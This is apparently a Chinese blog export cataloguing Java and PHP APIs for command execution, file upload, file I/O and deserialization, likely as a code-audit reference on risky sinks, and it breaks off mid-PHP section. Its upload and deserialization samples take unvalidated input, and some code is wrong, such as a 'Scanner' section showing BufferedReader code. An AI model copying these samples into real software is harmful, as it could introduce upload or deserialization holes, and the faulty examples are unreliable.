class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.BufferedReader;<br>import java.io.IOException;<br>import java.io.InputStreamReader;<br>import java.util.List;<br><br>public class CommandExecutionExample &#123;<br>    public static void main(String[] args) &#123;<br>        try &#123;<br>            // 执行命令：echo &quot;Hello, World!&quot;<br>            String command = &quot;echo&quot;;<br>            List&lt;String&gt; commandArgs = List.of(&quot;Hello, World!&quot;);<br>            ProcessBuilder processBuilder = new ProcessBuilder(command);<br>            processBuilder.command().addAll(commandArgs);<br>            <br>            // 启动进程并等待命令执行完成<br>            Process process = processBuilder.start();<br>            int exitCode = process.waitFor();<br>            <br>            // 读取命令输出<br>            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));<br>            String line;<br>            while ((line = reader.readLine()) != null) &#123;<br>                System.out.println(line);<br>            &#125;<br>            <br>            System.out.println(&quot;Exit Code: &quot; + exitCode);<br>            <br>        &#125; catch (IOException | InterruptedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ProcessBuilder-start"><a href="#ProcessBuilder-start" class="headerlink" title="ProcessBuilder.start()"></a>ProcessBuilder.start()</h2><p>创建一个新进程并执行指定的命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.IOException;<br><br>public class ProcessBuilderExample &#123;<br>    public static void main(String[] args) &#123;<br>        try &#123;<br>            // 创建 ProcessBuilder 对象并指定要执行的命令<br>            ProcessBuilder pb = new ProcessBuilder(&quot;ls&quot;, &quot;-l&quot;, &quot;/home&quot;);<br>            <br>            // 启动子进程执行命令<br>            Process process = pb.start();<br>            <br>            // 等待子进程执行完毕并获取返回值<br>            int exitCode = process.waitFor();<br>            <br>            // 输出子进程的返回值<br>            System.out.println(&quot;子进程的返回值: &quot; + exitCode);<br>        &#125; catch (IOException | InterruptedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder()"></a>ProcessBuilder()</h2><p>将子进程的输入、输出和错误流直接连接到当前进程的相应流。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.IOException;<br><br>public class InheritIOExample &#123;<br>    public static void main(String[] args) &#123;<br>        try &#123;<br>            // 创建ProcessBuilder对象，并设置要执行的命令<br>            ProcessBuilder processBuilder = new ProcessBuilder(&quot;cmd&quot;, &quot;/c&quot;, &quot;dir&quot;);<br>            <br>            // 将子进程的输入输出流与父进程保持一致<br>            processBuilder.inheritIO();<br>            <br>            // 启动子进程<br>            Process process = processBuilder.start();<br>            <br>            // 等待子进程执行完成<br>            int exitCode = process.waitFor();<br>            <br>            System.out.println(&quot;子进程执行完成，退出码：&quot; + exitCode);<br>        &#125; catch (IOException | InterruptedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="HttpServlet"><a href="#HttpServlet" class="headerlink" title="HttpServlet"></a>HttpServlet</h2><p>处理 HTTP 请求的基类，可以重写 <code>doPost()</code> 方法来处理文件上传。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import javax.servlet.http.HttpServlet;<br>import javax.servlet.http.HttpServletRequest;<br>import javax.servlet.http.Part;<br>import java.io.IOException;<br><br>public class FileUploadServlet extends HttpServlet &#123;<br>    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;<br>        // 获取上传的文件<br>        Part filePart = request.getPart(&quot;file&quot;);  // 通过请求对象获取上传的文件部分<br>        String fileName = filePart.getSubmittedFileName();  // 获取上传的文件名<br>        InputStream fileContent = filePart.getInputStream();  // 获取上传文件的输入流<br><br>        // 处理文件内容<br>        // ...<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="MultipartFile"><a href="#MultipartFile" class="headerlink" title="MultipartFile"></a>MultipartFile</h2><p>Spring 提供的用于处理文件上传的接口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import org.springframework.web.multipart.MultipartFile;<br>import org.springframework.stereotype.Controller;<br>import org.springframework.web.bind.annotation.PostMapping;<br>import org.springframework.web.bind.annotation.RequestParam;<br><br>@Controller<br>public class FileUploadController &#123;<br>    @PostMapping(&quot;/upload&quot;)<br>    public String handleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file) throws IOException &#123;<br>        String fileName = file.getOriginalFilename();  // 获取上传的文件名<br>        InputStream fileContent = file.getInputStream();  // 获取上传文件的输入流<br><br>        // 处理文件内容<br>        // ...<br><br>        return &quot;uploadSuccess&quot;;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><h2 id="Files"><a href="#Files" class="headerlink" title="Files"></a>Files</h2><p>读取文本文件的所有行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.IOException;<br>import java.nio.file.Files;<br>import java.nio.file.Paths;<br>import java.util.List;<br><br>public class FileReadExample &#123;<br>    public static void main(String[] args) &#123;<br>        try &#123;<br>            List&lt;String&gt; lines = Files.readAllLines(Paths.get(&quot;path/to/file.txt&quot;));<br>            for (String line : lines) &#123;<br>                System.out.println(line);<br>            &#125;<br>        &#125; catch (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="FileReader"><a href="#FileReader" class="headerlink" title="FileReader"></a>FileReader</h2><p>读取文本文件内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.FileReader;<br>import java.io.IOException;<br><br>public class FileReaderExample &#123;<br>    public static void main(String[] args) &#123;<br>        try (FileReader reader = new FileReader(&quot;file.txt&quot;)) &#123;<br>            int character;<br>            while ((character = reader.read()) != -1) &#123;<br>                System.out.print((char) character);<br>            &#125;<br>        &#125; catch (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="FileInputStream"><a href="#FileInputStream" class="headerlink" title="FileInputStream"></a>FileInputStream</h2><p>读取文件内。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.FileInputStream;<br>import java.io.IOException;<br><br>public class FileReadExample &#123;<br>    public static void main(String[] args) &#123;<br>        try &#123;<br>            FileInputStream fis = new FileInputStream(&quot;file.txt&quot;);<br>            int data;<br>            while ((data = fis.read()) != -1) &#123;<br>                System.out.print((char) data);<br>            &#125;<br>            fis.close();<br>        &#125; catch (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="BufferedReader"><a href="#BufferedReader" class="headerlink" title="BufferedReader"></a>BufferedReader</h2><p>用于从文件中逐行读取文本数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.BufferedReader;<br>import java.io.FileReader;<br>import java.io.IOException;<br><br>public class BufferedReaderExample &#123;<br>    public static void main(String[] args) &#123;<br>        try &#123;<br>            BufferedReader br = new BufferedReader(new FileReader(&quot;file.txt&quot;));<br>            String line;<br>            while ((line = br.readLine()) != null) &#123;<br>                System.out.println(line);<br>            &#125;<br>            br.close();<br>        &#125; catch (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h2><p>从文件或标准输入读取基本类型和字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.BufferedReader;<br>import java.io.FileReader;<br>import java.io.IOException;<br><br>public class BufferedReaderExample &#123;<br>    public static void main(String[] args) &#123;<br>        try &#123;<br>            BufferedReader br = new BufferedReader(new FileReader(&quot;file.txt&quot;));<br>            String line;<br>            while ((line = br.readLine()) != null) &#123;<br>                System.out.println(line);<br>            &#125;<br>            br.close();<br>        &#125; catch (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h1><h2 id="FileWriter"><a href="#FileWriter" class="headerlink" title="FileWriter"></a>FileWriter</h2><p>文件写入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.FileWriter;<br>import java.io.IOException;<br><br>public class FileWriteExample &#123;<br>    public static void main(String[] args) &#123;<br>        try &#123;<br>            FileWriter writer = new FileWriter(&quot;myfile.txt&quot;);  // 创建一个 FileWriter 对象，用于写入文件<br>            writer.write(&quot;Hello, World!&quot;);  // 将数据写入文件<br>            writer.close();  // 关闭 FileWriter<br>        &#125; catch (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="BufferedWriter"><a href="#BufferedWriter" class="headerlink" title="BufferedWriter"></a>BufferedWriter</h2><p>文件写入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.BufferedWriter;<br>import java.io.FileWriter;<br>import java.io.IOException;<br><br>public class BufferedWriterExample &#123;<br>    public static void main(String[] args) &#123;<br>        try &#123;<br>            BufferedWriter writer = new BufferedWriter(new FileWriter(&quot;myfile.txt&quot;));  // 创建一个 BufferedWriter 对象，用于写入文件<br>            writer.write(&quot;Hello, World!&quot;);  // 将数据写入文件<br>            writer.close();  // 关闭 BufferedWriter<br>        &#125; catch (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="PrintWriter"><a href="#PrintWriter" class="headerlink" title="PrintWriter"></a>PrintWriter</h2><p>文件写入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.FileWriter;<br>import java.io.IOException;<br>import java.io.PrintWriter;<br><br>public class PrintWriterExample &#123;<br>    public static void main(String[] args) &#123;<br>        try &#123;<br>            PrintWriter writer = new PrintWriter(new FileWriter(&quot;myfile.txt&quot;));  // 创建一个 PrintWriter 对象，用于写入文件<br>            writer.println(&quot;Hello, World!&quot;);  // 将数据写入文件，并自动换行<br>            writer.close();  // 关闭 PrintWriter<br>        &#125; catch (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Files-1"><a href="#Files-1" class="headerlink" title="Files"></a>Files</h2><p>文件写入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.IOException;<br>import java.nio.file.Files;<br>import java.nio.file.Path;<br>import java.nio.file.StandardOpenOption;<br><br>public class FilesWriteExample &#123;<br>    public static void main(String[] args) &#123;<br>        try &#123;<br>            String data = &quot;Hello, World!&quot;;<br>            Files.write(Path.of(&quot;myfile.txt&quot;), data.getBytes(), StandardOpenOption.CREATE);  // 将数据写入文件<br>        &#125; catch (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><h2 id="ObjectOutputStream"><a href="#ObjectOutputStream" class="headerlink" title="ObjectOutputStream"></a>ObjectOutputStream</h2><p>该类用于将对象序列化为字节流。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.FileOutputStream;<br>import java.io.ObjectOutputStream;<br>import java.io.Serializable;<br><br>public class SerializationExample &#123;<br>    public static void main(String[] args) &#123;<br>        MyClass obj = new MyClass();  // 创建一个可序列化的对象<br><br>        try &#123;<br>            FileOutputStream fileOut = new FileOutputStream(&quot;data.ser&quot;);  // 创建输出流<br>            ObjectOutputStream out = new ObjectOutputStream(fileOut);  // 创建对象输出流<br>            out.writeObject(obj);  // 序列化对象<br>            out.close();<br>            fileOut.close();<br>            System.out.println(&quot;对象已序列化并保存到文件中&quot;);<br>        &#125; catch (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ObjectInputStream"><a href="#ObjectInputStream" class="headerlink" title="ObjectInputStream"></a>ObjectInputStream</h2><p>用于从字节流中反序列化对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.FileInputStream;<br>import java.io.ObjectInputStream;<br><br>public class DeserializationExample &#123;<br>    public static void main(String[] args) &#123;<br>        MyClass obj = null;<br><br>        try &#123;<br>            FileInputStream fileIn = new FileInputStream(&quot;data.ser&quot;);  // 创建输入流<br>            ObjectInputStream in = new ObjectInputStream(fileIn);  // 创建对象输入流<br>            obj = (MyClass) in.readObject();  // 反序列化对象<br>            in.close();<br>            fileIn.close();<br>            System.out.println(&quot;从文件中读取并反序列化对象&quot;);<br>        &#125; catch (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>        // 使用反序列化得到的对象<br>        if (obj != null) &#123;<br>            // 对象已反序列化，可以进行操作<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="writeObject"><a href="#writeObject" class="headerlink" title="writeObject()"></a>writeObject()</h2><p>将对象序列化为字节流。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.*;<br><br>class MyClass implements Serializable &#123;<br>    private static final long serialVersionUID = 1L;<br>    <br>    private String name;<br>    <br>    public MyClass(String name) &#123;<br>        this.name = name;<br>    &#125;<br>    <br>    public void writeObject() &#123;<br>        try &#123;<br>            FileOutputStream fileOut = new FileOutputStream(&quot;object.ser&quot;);<br>            ObjectOutputStream out = new ObjectOutputStream(fileOut);<br>            out.writeObject(this);  // 将当前对象序列化为字节流<br>            out.close();<br>            fileOut.close();<br>            System.out.println(&quot;Object serialized successfully.&quot;);<br>        &#125; catch (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br>public class Main &#123;<br>    public static void main(String[] args) &#123;<br>        MyClass obj = new MyClass(&quot;John&quot;);<br>        obj.writeObject();  // 调用对象的序列化方法<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Externalizable"><a href="#Externalizable" class="headerlink" title="Externalizable"></a>Externalizable</h2><p>序列化。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.*;<br><br>// 实现 Externalizable 接口使对象可自定义序列化<br>class MyClass implements Externalizable &#123;<br>    private String name;<br><br>    public MyClass() &#123;<br>        // 默认构造函数必须提供，用于反序列化<br>    &#125;<br><br>    public MyClass(String name) &#123;<br>        this.name = name;<br>    &#125;<br><br>    public void writeExternal(ObjectOutput out) throws IOException &#123;<br>        // 自定义序列化过程<br>        out.writeObject(name);<br>    &#125;<br><br>    public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException &#123;<br>        // 自定义反序列化过程<br>        name = (String) in.readObject();<br>    &#125;<br><br>    public String getName() &#123;<br>        return name;<br>    &#125;<br>&#125;<br><br>public class ExternalizableExample &#123;<br>    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;<br>        MyClass obj = new MyClass(&quot;John&quot;);<br><br>        // 序列化对象到文件<br>        FileOutputStream fileOut = new FileOutputStream(&quot;object.ser&quot;);<br>        ObjectOutputStream out = new ObjectOutputStream(fileOut);<br>        out.writeObject(obj);<br>        out.close();<br>        fileOut.close();<br><br>        // 反序列化对象<br>        FileInputStream fileIn = new FileInputStream(&quot;object.ser&quot;);<br>        ObjectInputStream in = new ObjectInputStream(fileIn);<br>        MyClass newObj = (MyClass) in.readObject();<br>        in.close();<br>        fileIn.close();<br><br>        // 输出反序列化后的对象属性<br>        System.out.println(&quot;Deserialized Object Name: &quot; + newObj.getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="readObject"><a href="#readObject" class="headerlink" title="readObject()"></a>readObject()</h2><p>从字节流中反序列化对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.*;<br><br>class MyClass implements Serializable &#123;<br>    private static final long serialVersionUID = 1L;<br>    <br>    private String name;<br>    <br>    public MyClass() &#123;<br>        this.name = null;<br>    &#125;<br>    <br>    public void readObject() &#123;<br>        try &#123;<br>            FileInputStream fileIn = new FileInputStream(&quot;object.ser&quot;);<br>            ObjectInputStream in = new ObjectInputStream(fileIn);<br>            MyClass obj = (MyClass) in.readObject();  // 从字节流中反序列化对象<br>            this.name = obj.name;<br>            in.close();<br>            fileIn.close();<br>            System.out.println(&quot;Object deserialized successfully.&quot;);<br>        &#125; catch (IOException | ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br>public class Main &#123;<br>    public static void main(String[] args) &#123;<br>        MyClass obj = new MyClass();<br>        obj.readObject();  // 调用对象的反序列化方法<br>        System.out.println(&quot;Name: &quot; + obj.name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 函数</title>
      <link href="/2023/06/18/%E8%AF%AD%E8%A8%80/PHP/PHP%E5%87%BD%E6%95%B0/"/>
      <url>/2023/06/18/%E8%AF%AD%E8%A8%80/PHP/PHP%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<ul><li>支持的协议和封装协议<ul><li><a href="https://www.php.net/manual/zh/wrappers.file.php">file:&#x2F;&#x2F;</a></li><li><a href="https://www.php.net/manual/zh/wrappers.http.php">http:&#x2F;&#x2F;</a></li><li><a href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp:&#x2F;&#x2F;</a></li><li><a href="https://www.php.net/manual/zh/wrappers.php.php">php:&#x2F;&#x2F;</a></li><li><a href="https://www.php.net/manual/zh/wrappers.compression.php">zlib:&#x2F;&#x2F;</a></li><li><a href="https://www.php.net/manual/zh/wrappers.data.php">data:&#x2F;&#x2F;</a></li><li><a href="https://www.php.net/manual/zh/wrappers.glob.php">glob:&#x2F;&#x2F;</a></li><li><a href="https://www.php.net/manual/zh/wrappers.phar.php">phar:&#x2F;&#x2F;</a></li><li><a href="https://www.php.net/manual/zh/wrappers.ssh2.php">ssh2:&#x2F;&#x2F;</a></li><li><a href="https://www.php.net/manual/zh/wrappers.rar.php">rar:&#x2F;&#x2F;</a></li><li><a href="https://www.php.net/manual/zh/wrappers.audio.php">ogg:&#x2F;&#x2F;</a></li><li><a href="https://www.php.net/manual/zh/wrappers.expect.php">expect:&#x2F;&#x2F;</a></li></ul></li></ul><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2><p>用于执行外部程序，并返回最后一行输出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$result = exec(&#x27;ls -l&#x27;);<br>echo $result;<br></code></pre></td></tr></table></figure><h2 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h2><p>用于执行 shell 命令，并返回输出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$result = shell_exec(&#x27;ls -l&#x27;);<br>echo $result;<br></code></pre></td></tr></table></figure><h2 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h2><p>用于执行外部程序，并将输出直接打印到标准输出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 